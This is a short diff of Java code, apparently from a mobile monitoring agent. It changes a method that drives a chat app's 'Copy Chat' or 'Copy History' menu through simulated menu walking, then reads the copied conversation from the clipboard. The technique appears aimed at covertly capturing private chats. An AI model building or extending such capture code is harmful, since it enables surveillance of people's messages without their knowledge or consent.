@@ -119,10 +119,20 @@ public class ConversationScreen {
         debug.trace("extractConversation");
         //#endif
 
+        String before = (String) Clipboard.getClipboard().get();
+        String clip = "";
         // debug.trace("try copy chat: "+screen);
-        if (MenuWalker.walk("Copy Chat", screen, true)) {
-            String clip = (String) Clipboard.getClipboard().get();
-            Clipboard.getClipboard().put("");
+        if (MenuWalker.walk(new String[] { "Copy Chat", "Copy History" },
+                screen, true)) {
+
+            clip = (String) Clipboard.getClipboard().get();
+            try {
+                //Clipboard.getClipboard().put(before);
+            } catch (Exception ex) {
+                //#ifdef DEBUG
+                debug.error("extractConversation: clip " + ex);
+                //#endif
+            }
 
             if (!conversationScreens.contains(screen)) {
                 //#ifdef DEBUG
